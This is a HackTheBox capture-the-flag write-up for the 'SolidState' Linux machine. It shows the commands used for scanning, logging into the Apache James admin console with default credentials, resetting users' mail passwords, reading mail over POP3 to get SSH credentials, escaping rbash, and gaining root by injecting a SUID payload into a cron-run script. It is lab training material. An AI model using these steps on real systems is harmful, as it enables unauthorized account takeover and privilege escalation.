

# SolidState

**Platform:** HackTheBox  
**OS:** Linux (Debian 9)  
**Difficulty:** Medium  
**Date:** April 2026

---

## Summary

Linux machine running Apache James 2.3.2, a mail server with a 
remote administration interface accessible on port 4555 with default 
credentials. Admin access allows resetting user passwords and reading 
emails via POP3, revealing SSH credentials for mindy. Initial shell 
is restricted (rbash) but escapable. Privilege escalation via a 
world-writable Python script executed by a root cronjob.

---

## 1. Reconnaissance

Full port scan:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.10.51 -oG allPorts


TTL=63 confirms Linux target.
Open ports:



|Port|Service                        |
|----|-------------------------------|
|22  |SSH OpenSSH                    |
|25  |SMTP James 2.3.2               |
|80  |HTTP Apache 2.4.25             |
|110 |POP3 James 2.3.2               |
|119 |NNTP                           |
|4555|Apache James Remote Admin 2.3.2|

Detailed scan:

nmap -sCV -Pn -p22,25,80,110,119,4555 10.10.10.51 -oN targeted


2. James Admin Access — Port 4555
Connected to the James administration interface:

nc -nv 10.10.10.51 4555


Authenticated with default credentials:

Login id: root
Password: root


Listed existing users:

listusers
# james, thomas, john, mindy, mailadmin


Reset all user passwords to read their emails:

setpassword james 123
setpassword thomas 123
setpassword john 123
setpassword mindy 123
setpassword mailadmin 123


3. Email Enumeration — POP3 Port 110
Connected via telnet for better protocol handling:

telnet 10.10.10.51 110


Checked each user’s inbox:

USER mindy
PASS 123
LIST
RETR 1
RETR 2
QUIT


Found SSH credentials in mindy’s second email:

username: mindy
pass: P@55W0rd1!2@


4. SSH Access as Mindy
Connected bypassing rbash restriction:

ssh mindy@10.10.10.51 bash


Retrieved user flag:

cat ~/user.txt


5. Escaping rbash
Obtained a fully functional shell:

script /dev/null -c bash
export TERM=xterm


6. Privilege Escalation
Found world-writable Python script in /opt:

ls -l /opt/
# -rwxrwxrwx 1 root root 105 Aug 22 2017 /opt/tmp.py


Root executes this script via a cronjob every few minutes.
Injected SUID payload:

echo 'import os; os.system("chmod +s /bin/bash")' >> /opt/tmp.py


Waited for cronjob execution, then:

/bin/bash -p
whoami
# root


Retrieved root flag:

cat /root/root.txt


7. Flags
	•	user.txt ✅
	•	root.txt ✅

Tools Used



|Tool  |Purpose                     |
|------|----------------------------|
|nmap  |Port and service enumeration|
|netcat|James admin interface access|
|telnet|POP3 email reading          |
|Nikto |Web server enumeration      |

Vulnerabilities Found



|Vulnerability                |Description                 |
|-----------------------------|----------------------------|
|Default Credentials          |James Admin root:root       |
|Information Disclosure       |SSH credentials in email    |
|rbash Escape                 |script /dev/null bypass     |
|World-writable Cronjob Script|/opt/tmp.py executed as root|

Key Takeaways
	•	Always test default credentials on administration interfaces
	•	Non-standard ports like 4555 are often the main attack vector
	•	rbash is a weak restriction — escapable via script, python or bash
	•	World-writable files executed by root cronjobs are critical privesc vectors
	•	telnet handles interactive protocols like POP3 better than netcat

| Linux | Medium | Default Credentials, POP3 Email Enumeration, rbash Escape, Cronjob Abuse | [📄 Read](./HackTheBox/SolidState/writeup.md) |
